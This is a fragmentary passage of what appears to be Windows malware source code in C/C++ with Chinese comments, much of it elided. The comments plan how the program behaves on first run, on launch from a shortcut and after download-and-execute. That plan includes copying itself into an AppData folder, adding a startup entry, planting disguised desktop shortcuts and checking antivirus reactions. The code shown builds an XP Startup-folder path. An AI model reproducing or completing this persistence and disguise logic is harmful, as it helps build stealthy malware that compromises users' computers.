...
//4 退出并从新目录启动程序(用户点击需要从新的目录启动)

//二 快捷方式调用或者下载后被执行
//快捷方式可以肯定是第二次运行,不需要打开文件，不需要移动文件到目标目录，不需要设置启动项和释放图标
//以及设置桌面伪装快捷方式，不需要检测杀软的反应，但是需要打开指向的程序，需要检查伪装快捷方式指向的参数目标，打开相应的程序才行

//三 被下载执行
//下载执行可以肯定自己位于c:\users\appdata\username\services目录
//下载执行不需要打开文件，移动文件到目的目录,但是需要释放图标，检测杀软的反应
...
// 		}
		...
		if (iRet == FALSE)
		{
			...
			else
			{
				if (iSystemVersion <= SYSTEM_VERSION_XP)
				{
					// 				char szXPStartupFileFormat[] = "C:\\Documents and Settings\\%s\\「开始」菜单\\程序\\启动\\";
